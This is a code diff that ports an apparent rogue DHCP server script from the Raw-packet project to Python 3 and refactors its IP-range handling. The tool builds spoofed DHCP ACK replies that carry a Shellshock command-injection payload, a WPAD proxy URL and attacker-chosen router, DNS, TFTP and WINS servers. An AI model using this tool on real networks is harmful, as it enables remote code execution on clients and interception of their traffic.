@@ -16,6 +16,7 @@ Copyright 2019, Raw-packet Project
 from sys import path
 from os.path import dirname, abspath
 path.append(dirname(dirname(dirname(abspath(__file__)))))
+utils_path = dirname(dirname(dirname(abspath(__file__)))) + "/raw_packet/Utils/"
 # endregion
 
 # region Raw-packet modules
@@ -28,15 +29,18 @@ from raw_packet.Scanners.scanner import Scanner
 # region Import libraries
 from sys import exit
 from argparse import ArgumentParser
-from ipaddress import IPv4Address
 from socket import socket, AF_PACKET, SOCK_RAW, htons
-from os import errno, makedirs
+try:
+    from os import errno, makedirs
+except ImportError:
+    from os import makedirs
 from shutil import copyfile
 from base64 import b64encode
 from netaddr import IPAddress
 from time import sleep
 from random import randint
 import subprocess as sub
+from sys import version_info
 # endregion
 
 # endregion
@@ -46,7 +50,7 @@ __author__ = 'Vladimir Ivanov'
 __copyright__ = 'Copyright 2019, Raw-packet Project'
 __credits__ = ['']
 __license__ = 'MIT'
-__version__ = '0.0.4'
+__version__ = '0.1.1'
 __maintainer__ = 'Vladimir Ivanov'
 __email__ = 'ivanov.vladimir.mail@gmail.com'
 __status__ = 'Development'
@@ -163,19 +167,8 @@ if args.interface is None:
 current_network_interface = Base.netiface_selection(args.interface)
 
 your_mac_address = Base.get_netiface_mac_address(current_network_interface)
-if your_mac_address is None:
-    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
-    exit(1)
-
 your_ip_address = Base.get_netiface_ip_address(current_network_interface)
-if your_ip_address is None:
-    Base.print_error("Network interface: ", current_network_interface, " do not have IP address!")
-    exit(1)
-
 your_network_mask = Base.get_netiface_netmask(current_network_interface)
-if your_network_mask is None:
-    Base.print_error("Network interface: ", current_network_interface, " do not have network mask!")
-    exit(1)
 
 if args.netmask is None:
     network_mask = your_network_mask
@@ -189,8 +182,8 @@ SOCK.bind((current_network_interface, 0))
 # endregion
 
 # region Get first and last IP address in your network
-first_ip_address = str(IPv4Address(unicode(Base.get_netiface_first_ip(current_network_interface))) - 1)
-last_ip_address = str(IPv4Address(unicode(Base.get_netiface_last_ip(current_network_interface))) + 1)
+first_ip_address = Base.get_netiface_first_ip(current_network_interface, 1)
+last_ip_address = Base.get_netiface_last_ip(current_network_interface, -2)
 # endregion
 
 # region Set target MAC and IP address, if target IP is not set - get first and last offer IP
@@ -212,15 +205,15 @@ if args.target_ip is not None:
         exit(1)
 
     # Set default first offer IP and last offer IP
-    first_offer_ip_address = str(IPv4Address(unicode(first_ip_address)) + 1)
-    last_offer_ip_address = str(IPv4Address(unicode(last_ip_address)) - 1)
+    first_offer_ip_address = Base.get_netiface_first_ip(current_network_interface)
+    last_offer_ip_address = Base.get_netiface_last_ip(current_network_interface)
 # endregion
 
 # region Target IP is not set - get first and last offer IP
 else:
     # Check first offer IP address
     if args.first_offer_ip is None:
-        first_offer_ip_address = str(IPv4Address(unicode(first_ip_address)) + 1)
+        first_offer_ip_address = Base.get_netiface_first_ip(current_network_interface)
     else:
         if not Base.ip_address_in_range(args.first_offer_ip, first_ip_address, last_ip_address):
             Base.print_error("Bad value `-f, --first_offer_ip`: ", args.first_offer_ip,
@@ -231,7 +224,7 @@ else:
 
     # Check last offer IP address
     if args.last_offer_ip is None:
-        last_offer_ip_address = str(IPv4Address(unicode(last_ip_address)) - 1)
+        last_offer_ip_address = Base.get_netiface_last_ip(current_network_interface)
     else:
         if not Base.ip_address_in_range(args.last_offer_ip, first_ip_address, last_ip_address):
             Base.print_error("Bad value `-l, --last_offer_ip`: ", args.last_offer_ip,
@@ -254,8 +247,8 @@ if args.dhcp_ip is None:
     dhcp_server_ip_address = your_ip_address
 else:
     if not Base.ip_address_in_range(args.dhcp_ip, first_ip_address, last_ip_address):
-        Base.print_error("Bad value `--dhcp_ip`: ", args.dhcp_ip,
-                         "; DHCP server IP address must be in range: ", first_ip_address + " - " + last_ip_address)
+        Base.print_error("Bad value `--dhcp_ip`: ", args.dhcp_ip, "; DHCP server IP address must be in range: ",
+                         first_ip_address + " - " + last_ip_address)
         exit(1)
     else:
         dhcp_server_ip_address = args.dhcp_ip
@@ -390,7 +383,10 @@ if 255 < args.shellshock_option_code < 0:
 # endregion
 
 # region Set search domain
-domain = bytes(args.domain)
+if version_info < (3, 0):
+    domain = bytes(args.domain)
+else:
+    domain = args.domain.encode('utf-8')
 # endregion
 
 # region General output
@@ -425,9 +421,9 @@ def get_free_ip_addresses():
     global Scanner
     # Get all IP addresses in range from first to last offer IP address
     current_ip_address = first_offer_ip_address
-    while IPv4Address(unicode(current_ip_address)) <= IPv4Address(unicode(last_offer_ip_address)):
+    while Base.ip_address_compare(current_ip_address, last_offer_ip_address, 'le'):
         free_ip_addresses.append(current_ip_address)
-        current_ip_address = str(IPv4Address(unicode(current_ip_address)) + 1)
+        current_ip_address = Base.ip_address_increment(current_ip_address)
 
     Base.print_info("ARP scan on interface: ", current_network_interface, " is running ...")
     localnet_ip_addresses = Scanner.find_ip_in_local_network(current_network_interface)
@@ -479,25 +475,53 @@ def make_dhcp_ack_packet(transaction_id, target_mac, target_ip, destination_mac=
         destination_mac = "ff:ff:ff:ff:ff:ff"
     if destination_ip is None:
         destination_ip = "255.255.255.255"
-    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
-                                     destination_mac=destination_mac,
-                                     source_ip=dhcp_server_ip_address,
-                                     destination_ip=destination_ip,
-                                     transaction_id=transaction_id,
-                                     your_ip=target_ip,
-                                     client_mac=target_mac,
-                                     dhcp_server_id=dhcp_server_ip_address,
-                                     lease_time=args.lease_time,
-                                     netmask=network_mask,
-                                     router=router_ip_address,
-                                     dns=dns_server_ip_address,
-                                     dhcp_operation=5,
-                                     payload=shellshock_url,
-                                     proxy=bytes(wpad_url),
-                                     domain=domain,
-                                     tftp=tftp_server_ip_address,
-                                     wins=wins_server_ip_address,
-                                     payload_option_code=args.shellshock_option_code)
+
+    if wpad_url is not None:
+        try:
+            wpad_url_bytes = bytes(wpad_url)
+        except TypeError:
+            wpad_url_bytes = wpad_url.encode('utf-8')
+
+        dhcp_ack_packet = dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
+                                                    destination_mac=destination_mac,
+                                                    source_ip=dhcp_server_ip_address,
+                                                    destination_ip=destination_ip,
+                                                    transaction_id=transaction_id,
+                                                    your_ip=target_ip,
+                                                    client_mac=target_mac,
+                                                    dhcp_server_id=dhcp_server_ip_address,
+                                                    lease_time=args.lease_time,
+                                                    netmask=network_mask,
+                                                    router=router_ip_address,
+                                                    dns=dns_server_ip_address,
+                                                    dhcp_operation=5,
+                                                    payload=shellshock_url,
+                                                    proxy=wpad_url_bytes,
+                                                    domain=domain,
+                                                    tftp=tftp_server_ip_address,
+                                                    wins=wins_server_ip_address,
+                                                    payload_option_code=args.shellshock_option_code)
+    else:
+        dhcp_ack_packet = dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
+                                                    destination_mac=destination_mac,
+                                                    source_ip=dhcp_server_ip_address,
+                                                    destination_ip=destination_ip,
+                                                    transaction_id=transaction_id,
+                                                    your_ip=target_ip,
+                                                    client_mac=target_mac,
+                                                    dhcp_server_id=dhcp_server_ip_address,
+                                                    lease_time=args.lease_time,
+                                                    netmask=network_mask,
+                                                    router=router_ip_address,
+                                                    dns=dns_server_ip_address,
+                                                    dhcp_operation=5,
+                                                    payload=shellshock_url,
+                                                    domain=domain,
+                                                    tftp=tftp_server_ip_address,
+                                                    wins=wins_server_ip_address,
+                                                    payload_option_code=args.shellshock_option_code)
+
+    return dhcp_ack_packet
 # endregion
 
 
